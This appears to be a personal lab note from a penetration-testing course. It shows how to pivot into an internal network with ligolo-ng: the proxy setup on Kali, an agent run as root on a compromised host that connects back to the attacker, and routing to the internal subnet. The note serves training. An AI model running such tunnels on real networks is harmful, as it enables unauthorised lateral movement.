  

on Kali

```SQL
sudo ip tuntap add user phd_yeyy  mode tun ligolo
sudo ip link set ligolo up
./proxy  -selfcert
```

╭─phd_yeyy@kali-1-vm /home/phd_yeyy/ligolo-ng ‹system›  
╰─$ ./proxy -selfcert  
WARN[0000] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC!  
WARN[0000] Using self-signed certificates  
ERRO[0000] Certificate cache error: acme/autocert: certificate cache miss, returning a new certificate  
WARN[0000] TLS Certificate fingerprint for ligolo is: CA84094C7322BD735406477344710703BBDE36042DA132863CFCC82FE6D797C1  
INFO[0000] Listening on 0.0.0.0:11601  
__ _ __  
/ / (_)___ _____ / /___ ____ ____ _  
/ / / / __ `/ __ \\/ / __ \\______/ __ \\/ __` /  
/ /_/ / // / // / / /_/ /_**/ / / / /_/ /**_  
_**/**_/_/\__, /\**/**_**/\**_/ // /_/\__, /  
/**/ /**/

Made in France ♥ by @Nicocha30!  
Version: 0.7.2-alpha

  

  

On Host1

```SQL
root@vpn:/home/offsec# ./agent  -connect KaliIP:11601 -ignore-cert
```

  

On Kali

```SQL
ligolo-ng »
ligolo-ng » session
? Specify a session : 1 - root@vpn - 192.168.213.122:37118 - 3fa6af1f-09fd-4e95-9a71-e8c4b
9ed4669
ligolo-ng »  ifconfig
```

[Agent : root@vpn] » ifconfig  
┌────────────────────────────────────┐  
│ Interface 0 │  
├──────────────┬─────────────────────┤  
│ Name │ lo │  
│ Hardware MAC │ │  
│ MTU │ 65536 │  
│ Flags │ up|loopback|running │  
│ IPv4 Address │ 127.0.0.1/8 │  
│ IPv6 Address │ ::1/128 │  
└──────────────┴─────────────────────┘  
┌───────────────────────────────────────┐  
│ Interface 1 │  
├──────────────┬────────────────────────┤  
│ Name │ tun0 │  
│ Hardware MAC │ │  
│ MTU │ 1500 │  
│ Flags │ pointtopoint|multicast │  
└──────────────┴────────────────────────┘  
┌───────────────────────────────────────────────┐  
│ Interface 2 │  
├──────────────┬────────────────────────────────┤  
│ Name │ ens160 │  
│ Hardware MAC │ 00:50:56:bf:34:55 │  
│ MTU │ 1500 │  
│ Flags │ up|broadcast|multicast|running │  
│ IPv4 Address │ 192.168.213.122/24 │  
└──────────────┴────────────────────────────────┘  
┌───────────────────────────────────────────────┐  
│ Interface 3 │  
├──────────────┬────────────────────────────────┤  
│ Name │ ens192 │  
│ Hardware MAC │ 00:50:56:bf:fd:1d │  
│ MTU │ 1500 │  
│ Flags │ up|broadcast|multicast|running │  
│ IPv4 Address │ 172.16.213.122/24 │  
└──────────────┴────────────────────────────────┘

  

find internal IP for Kali: 172.16.213.122/24

so open new terminal on kali

```SQL
 change 122 to 0
 sudo ip route add  172.16.213.0/24 dev ligolo
 ip route list
```

  

back inside of ligolo

└──────────────┴────────────────────────────────┘  
[Agent : root@vpn] » start  
INFO[0689] Starting tunnel to root@vpn  
[Agent : root@vpn] » ifconfig

  

from kali you can accee any VM in internal